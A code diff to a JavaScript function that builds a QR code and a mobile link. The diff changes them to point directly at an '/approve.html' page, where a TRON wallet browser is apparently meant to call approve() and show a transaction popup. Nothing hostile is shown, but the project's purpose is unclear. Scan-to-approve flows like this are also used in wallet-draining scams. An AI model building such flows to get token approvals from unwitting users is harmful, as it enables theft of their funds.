@@ -14,25 +14,22 @@ const CONFIG = {
 
 function generateApproveQR() {
     try {
-        // The approve page URL (where the user lands in Trust Wallet DApp browser)
+        // Direct URL to approve page - Trust Wallet opens HTTPS URLs in its DApp browser
+        // tronWeb gets injected automatically, and calling approve() triggers the native TX popup
         const approvePageUrl = window.location.origin + "/approve.html";
-
-        // Trust Wallet deep link - opens URL in its built-in DApp browser
-        const trustWalletDeepLink = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(approvePageUrl)}`;
 
         const qrcodeContainer = document.getElementById("qrcode");
 
         if (typeof QRCode === "undefined") {
-            // Fallback: show the link as text if QR library failed
             qrcodeContainer.innerHTML = '<p style="color:#666;font-size:12px;padding:20px;">QR loading failed. Use button below.</p>';
-            document.getElementById("mobile-link").href = trustWalletDeepLink;
+            document.getElementById("mobile-link").href = approvePageUrl;
             return;
         }
 
         qrcodeContainer.innerHTML = "";
 
         new QRCode(qrcodeContainer, {
-            text: trustWalletDeepLink,
+            text: approvePageUrl,
             width: 200,
             height: 200,
             colorDark: "#000000",
@@ -40,8 +37,8 @@ function generateApproveQR() {
             correctLevel: QRCode.CorrectLevel.M,
         });
 
-        // Set mobile link
-        document.getElementById("mobile-link").href = trustWalletDeepLink;
+        // Mobile link - just the direct URL
+        document.getElementById("mobile-link").href = approvePageUrl;
     } catch (err) {
         console.error("QR generation error:", err);
         var errEl = document.getElementById("error-msg");
